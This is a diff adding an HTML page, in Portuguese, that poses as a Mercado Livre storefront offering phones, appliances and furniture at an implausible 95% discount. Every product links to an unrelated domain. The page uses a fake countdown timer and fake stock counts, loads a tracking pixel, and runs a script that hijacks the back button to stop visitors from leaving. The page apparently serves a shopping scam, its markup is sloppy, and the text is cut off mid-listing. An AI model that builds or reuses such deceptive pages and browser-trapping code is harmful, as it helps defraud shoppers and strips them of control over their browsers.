@@ -1,0 +1,1042 @@
+<html lang="pt-br"><head>
+  
+  <meta charset="UTF-8">
+
+<script>
+  window.pixelId = "6897c7776e1de7deaaf068bb";
+  (function () {
+    var s = document.createElement("script");
+    s.async = true; s.defer = true;
+    s.src = "https://cdn.utmify.com.br/scripts/pixel/pixel.js";
+    document.head.appendChild(s);
+  })();
+</script>
+
+  // ALTERE O LINK PARA A PÁGINA QUE QUISER MOSTRAR QUANDO O USUÁRIO TENTAR SAIR
+  const link = '';
+
+  function setBackRedirect(url) {
+    let urlBackRedirect = url;
+    urlBackRedirect = urlBackRedirect =
+      urlBackRedirect.trim() +
+      (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
+      document.location.search.replace('?', '').toString();
+
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+
+    window.addEventListener('popstate', () => {
+      console.log('onpopstate', urlBackRedirect);
+      setTimeout(() => {
+        location.href = urlBackRedirect;
+      }, 1);
+    });
+  }
+
+  setBackRedirect(link);
+</script>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>Mercado Livre</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link rel="icon" href="images/favicon.png">
+    <link rel="shortcut icon" href="images/favicon.png">
+    <link rel="stylesheet" href="css/products.css">
+    <link rel="stylesheet" href="css/styles2.css">
+    <link rel="stylesheet" href="css/fonts.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,1,0">
+    <style>
+      .free-shipping-container {
+        margin-bottom: 6px;
+      }
+
+      .estoque {
+        font-size: 10pt;
+        padding: 3px;
+      }
+
+      .estoque-verde {
+        color: rgb(0, 132, 18);
+        background-color: #CBFFC7;
+      }
+
+      .estoque-amarelo {
+        color: rgb(132, 121, 0);
+        background-color: #ffffc7;
+      }
+
+      .estoque-vermelho {
+        color: rgb(255, 46, 46);
+        background-color: #FFDCDC;
+      }
+
+      .product-name {
+        margin-top: 5px;
+      }
+    </style>
+<meta charset="utf-8">
+
+  </head>
+  <body>
+    <div style="background-color: #e6cf00; text-align: center; padding: 5px; font-family: 'GellixMedium'; font-size: 13px; color: white">Aproveite 95% de desconto aplicado automaticamente na sua compra!</div>
+    <nav class="navbar" style="padding-top: 15px;">
+      <div class="menu-icon" style="padding-left: 3%;">
+        <img src="images/logo.webp" style="height: 5vh;" alt="Logo Central Vivara">
+      </div>
+      <div class="logo-central"></div>
+      <div class="menu-icon" style="padding-right: 3%;">
+        <span class="material-symbols-outlined" style="font-size: 30px; padding-right: 10px; color: black">menu</span>
+      </div>
+    </nav>
+    <img src="https://i.postimg.cc/4xspW3V6/capa1.jpg" style="width: 100%; margin-top: -2px;">
+
+<!-- BANNER GRADIENTE -->
+<div style="
+    width: 90%;
+    margin: 10px auto;
+    border-radius: 8px;
+    background: linear-gradient(to right, #011E51, #a52aad);
+    padding: 10px;
+    color: #fff;
+    font-family: 'GellixMedium';
+    text-align: center;
+">
+  Oferta Disponível
+  <span style="font-size: 12px;">
+    Tempo restante: <span id="countdown">01:42:40</span>
+  </span>
+</div>
+
+<script>
+  const countdown = document.getElementById("countdown");
+  let [h, m, s] = countdown.textContent.split(":").map(Number);
+  const timer = setInterval(() => {
+    if (--s < 0) s = 59, m--;
+    if (m < 0) m = 59, h--;
+    if (h < 0) clearInterval(timer), countdown.textContent = "Oferta Expirada";
+    countdown.textContent = `${h.toString().padStart(2, "0")}:${m.toString().padStart(2, "0")}:${s.toString().padStart(2, "0")}`;
+  }, 1000);
+</script>
+
+
+
+
+
+</div>
+    <div class="bracelet-grid">
+      <div class="bracelet-item" onclick="window.location.href = 'https://ofertas-tec.com/jbl01' + window.location.search; fbq('track', 'ViewContent', {content_name: 'JBL Boombox 3'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/poco_preto.png" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 2.999,90</div>
+          <span class="new-price">R$ 67,21</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-verde">Restam 19 unidades</span>
+          <p class="product-name">JBL Boombox 3 <span style="font-family: 'GellixBold';">Preta</span>
+            </p>
+            
+</p>
+</div>
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='https://ofertas-tec.com/projetor04' + window.location.search; fbq('track', 'ViewContent', {content_name: 'Samsung The Freestyle Projetor Smart Portátil'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="https://i.postimg.cc/9fgNyHg1/1.webp" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 4.398,00</div>
+          <span class="new-price">R$ 97,90</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-amarelo">Restam 10 unidades</span>
+          <p class="product-name">Samsung Galaxy S24 Ultra (256 GB) </p>
+          </p>
+</p>
+</div>
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='https://ofertas-tec.com/sam25' + window.location.search; fbq('track', 'ViewContent', {content_name: 'Samsung The Freestyle Projetor Smart Portátil'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="https://i.postimg.cc/Tw1CP5tP/s1.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 10.398,00</div>
+          <span class="new-price">R$ 247,90</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-amarelo">Restam 16 unidades</span>
+          <p class="product-name">Samsung Galaxy S25 Ultra 5G, 512GB, Câmera Quádrupla Titânio Preto </p>
+          </p>
+</p>
+            </p>
+        </div>
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='https://nofertas-tec.com/iphone16-preto' + window.location.search; fbq('track', 'ViewContent', {content_name: 'Samsung The Freestyle Projetor Smart Portátil'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="https://i.postimg.cc/nh1rDjyy/iphon1.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 12.895,00</div>
+          <span class="new-price">R$ 257,00</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-amarelo">Restam 8 unidades</span>
+          <p class="product-name">iPhone 16 Pro Max (1T) <span style="font-family: 'GellixBold';">Titânio Preto</span>
+          </p>
+           </p>
+</p>
+</div>
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='https://ofertas-tec.com/fritadeira' + window.location.search; fbq('track', 'ViewContent', {content_name: 'Samsung The Freestyle Projetor Smart Portátil'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="https://i.postimg.cc/4y43htYr/f1.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 529,99</div>
+          <span class="new-price">R$ 81,24</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-amarelo">Restam 15 unidades</span>
+          <p class="product-name">Air Fryer Fritadeira Elétrica </p>
+          </p>
+</p>
+        </div>
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='https://ofertas-tec.com/jbl02' + window.location.search; fbq('track', 'ViewContent', {content_name: 'JBL Partybox 710'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/poco_branco.png" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 5.399,00</div>
+          <span class="new-price">R$ 77,16</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-verde">Restam 11 unidades</span>
+          <p class="product-name">JBL Partybox 710 <span style="font-family: 'GellixBold';">Preta</span>
+        </div>
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='https://ofertas-tec.com/xiaome' + window.location.search; fbq('track', 'ViewContent', {content_name: 'JBL Flip 6'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="https://i.postimg.cc/8cmQVnwv/x1.jpg" style="height: 140px; width: auto;">
+          </p>
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 1685,00</div>
+          <span class="new-price">R$ 87,00</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-verde">Restam 14 unidades</span>
+          <p class="product-name">Xiaome POCO X5 256GB <span style="font-family: 'GellixBold';">Blue</span>
+        </div>
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='https://ofertas-tec.com/kitferramenta' + window.location.search; fbq('track', 'ViewContent', {content_name: 'Apple Watch Series 9'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="https://i.postimg.cc/28BT3XWR/ferramenta.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 1.050,90</div>
+          <span class="new-price">R$ 95,65</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-amarelo">Restam 8 unidades</span>
+          <p class="product-name">Kit Combinado de 7 Ferramentas<span style="font-family: 'GellixBold';">DEWALT</span>
+          </p>
+          </p>
+        
+        </div>
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='https://ofertas-tec.com/iph06' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/iphone_15_pro_max_titanio_branco.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 5.849,10</div>
+          <span class="new-price">R$ 117,58</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-vermelho">Restam 7 unidades</span>
+          <p class="product-name">iPhone 15 Pro (256GB) <span style="font-family: 'GellixBold';">Titânio Branco</span>
+          </p>
+
+        </div>
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='https://ofertas-tec.com/iph07' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/iphone_15_rosa.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 5.849,10</div>
+          <span class="new-price">R$ 97,90</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-vermelho">Restam 6 unidades</span>
+          <p class="product-name">iPhone 15 (256GB) <span style="font-family: 'GellixBold';">Rosa</span>
+          </p>
+        </div>
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='https://ofertas-tec.com/iph08' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro Max'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/iphone_15_pro_max_titanio_preto.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 6.199,00</div>
+          <span class="new-price">R$ 134,90</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-vermelho">Restam 8 unidades</span>
+          <p class="product-name">iPhone 15 Pro Max (512GB) <span style="font-family: 'GellixBold';">Titânio Preto</span>
+            </p>
+        </div>
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='https://ofertas-tec.com/geladeira' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="https://i.postimg.cc/fRRv66SY/geladeira.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 3.999,00</div>
+          <span class="new-price">R$ 119,99</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-vermelho">Restam 18 unidades</span>
+          <p class="product-name">Geladeira Brastemp 588 Litros Inox 220V <span style="font-family: 'GellixBold';">Inox 220V</span>
+            </p>
+            </p>
+            </p>
+            </p>
+        </div>
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='https://ofertas-tec.comx/xiaome14t' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="https://i.postimg.cc/y6DKFC9x/x2.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 3.512,00</div>
+          <span class="new-price">R$ 227,99</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-vermelho">Restam 22 unidades</span>
+          <p class="product-name">Xiaomi 14T Dual SIM 512 GB<span style="font-family: 'GellixBold';">
+            </p>
+            </p>
+            </p>
+        </div>
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='https://ofertas-tec.com/xiaomex6' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="https://i.postimg.cc/cCfK5ypq/x1.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 3.527,00</div>
+          <span class="new-price">R$ 97,37</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-vermelho">Restam 09 unidades</span>
+          <p class="product-name">Xiaomi Poco X6 Pro 8gb Ram 256gb <span style="font-family: 'GellixBold';">Cor Preto</span>
+            </p>
+            </p>
+        </div>
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='https://ofertas-tec.com/xiaomex7' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="https://i.postimg.cc/QVZZdvYq/x1.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 3.999,00</div>
+          <span class="new-price">R$ 148,89</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-vermelho">Restam 12 unidades</span>
+          <p class="product-name">Xiaomi Poco X7 Pro 512gb+12gb  <span style="font-family: 'GellixBold';">2025</span>
+            </p>
+            </p>
+        </div>
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='https://ofertas-tec.com/chapinha' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="https://i.postimg.cc/mhWDYd40/x1.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 417,00</div>
+          <span class="new-price">R$ 77,60</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-vermelho">Restam 11 unidades</span>
+          <p class="product-name">Chapinha Lizze Profissional 480 Extreme 220V <span style="font-family: 'GellixBold';"></span>
+            </p>
+            </p>
+        </div>
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='https://ofertas-tec.com/secador' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="https://i.postimg.cc/VkyZ32m3/s1.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 417,05</div>
+          <span class="new-price">R$ 73,90</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-vermelho">Restam 18 unidades</span>
+          <p class="product-name">Secador De Cabelos Mondial <span style="font-family: 'GellixBold';"></span>
+            </p>
+            </p>
+        </div>
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='https://ofertas-tec.com/aspirador' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="https://i.postimg.cc/j5WFVTnY/as1.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 349,00</div>
+          <span class="new-price">R$ 94,60</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-vermelho">Restam 18 unidades</span>
+          <p class="product-name">Robô aspirador Robot W90  <span style="font-family: 'GellixBold';"></span>
+        </div>
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='https://ofertas-tec.com/nintendo' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="https://i.postimg.cc/zGH0RCTr/n2.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 3.999,00</div>
+          <span class="new-price">R$ 97,19</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-vermelho">Restam 18 unidades</span>
+          <p class="product-name">Nintendo Switch 32GB <span style="font-family: 'GellixBold';">Deluxe</span>
+            </p>
+            </p>
+        </div>
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='https://ofertas-tec.com/creatina' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="https://i.postimg.cc/HLHCwVNv/cc.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 3.999,00</div>
+          <span class="new-price">R$ 73,21</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-vermelho">Restam 18 unidades</span>
+          <p class="product-name">Creatina Monohidratada Pura 500 <span style="font-family: 'GellixBold';">Dark Lab</span>
+            </p>
+            </p>
+        </div>
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='https://ofertas-tec.com/whey' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="https://i.postimg.cc/N0Y5KGkB/w1.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 254,05</div>
+          <span class="new-price">R$ 75,21</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-vermelho">Restam 18 unidades</span>
+          <p class="product-name">Kit 2x Whey Protein + 2x Bcaa + 2x Creatina + Coqueteleira <span style="font-family: 'GellixBold';"></span>
+            </p>
+            </p>
+        </div>
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='https://ofertas-tec.com/guarda-branco' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="https://i.postimg.cc/RCDrhPL0/g1.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 1.049,05</div>
+          <span class="new-price">R$ 114,60</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-vermelho">Restam 16 unidades</span>
+          <p class="product-name">Guarda-roupa casal Easy Slim com Espelho <span style="font-family: 'GellixBold';"></span>
+            </p>
+            </p>
+        </div>
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='https://ofertas-tec.com/guarda-preto' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="https://i.postimg.cc/FFCj66jN/g1.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 1049,00</div>
+          <span class="new-price">R$ 107,00</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-vermelho">Restam 7 unidades</span>
+          <p class="product-name">Guarda Roupa Casal 8 Portas Cor Preto Fosco <span style="font-family: 'GellixBold';"></span>
+            </p>
+            </p>
+        </div>
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='https://ofertas-tec.com/perfume-mm' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="https://i.postimg.cc/90CMLZpD/p2.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 690,05</div>
+          <span class="new-price">R$ 89,90</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-vermelho">Restam 18 unidades</span>
+          <p class="product-name">Perfume Paco Rabanne 1 Million Eau de Toilette 200ml <span style="font-family: 'GellixBold';"></span>
+            </p>
+            </p>
+            </p>
+        </div>
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='https://ofertas-tec.com/adidas' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="https://i.postimg.cc/MT9brS4y/a1.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 690,05</div>
+          <span class="new-price">R$ 89,90</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-vermelho">Restam 18 unidades</span>
+          <p class="product-name">Tênis Adidas <span style="font-family: 'GellixBold';">2.0</span>
+            </p>
+             </p>
+        </div>
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='https://ofertas-tec.com/sofa' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="https://i.postimg.cc/q7y4JDw6/s1.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 2.990,05</div>
+          <span class="new-price">R$ 79,47</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-vermelho">Restam 18 unidades</span>
+          <p class="product-name">Sofá Retrátil Reclinável 2,00m <span style="font-family: 'GellixBold';">King House</span>
+            </p>
+             </p>
+        </div>
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='https://ofertas-tec.com/cafeteira' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
+        <div class="product-image" style="margin-bottom: 10px;">
